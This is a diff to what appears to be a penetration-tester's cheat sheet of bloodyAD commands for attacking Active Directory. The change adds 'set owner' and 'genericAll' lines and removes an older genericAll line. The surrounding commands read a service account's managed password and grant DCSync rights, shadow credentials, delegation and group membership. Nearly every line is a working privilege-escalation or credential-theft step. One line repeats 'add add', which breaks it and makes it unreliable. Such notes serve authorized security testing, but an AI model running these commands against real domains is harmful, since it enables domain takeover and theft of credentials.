@@ -377,11 +377,12 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object MGTSVC$ --attr msDS-ManagedPassword
 
 +---------- Add ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set owner 'GROUP' 'USER'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'GROUP' 'USER'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'GROUP' 'USER'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add user 'myuser' '123qweasdF!'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add computer 'mypc' '123qweasdF!'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add rbcd 'TARGET' 'SERVICE'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'TARGET' 'TRUSTEE'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dcsync 'TRUSTEE'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add shadowCredentials 'TARGET'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add add uac 'TARGET'
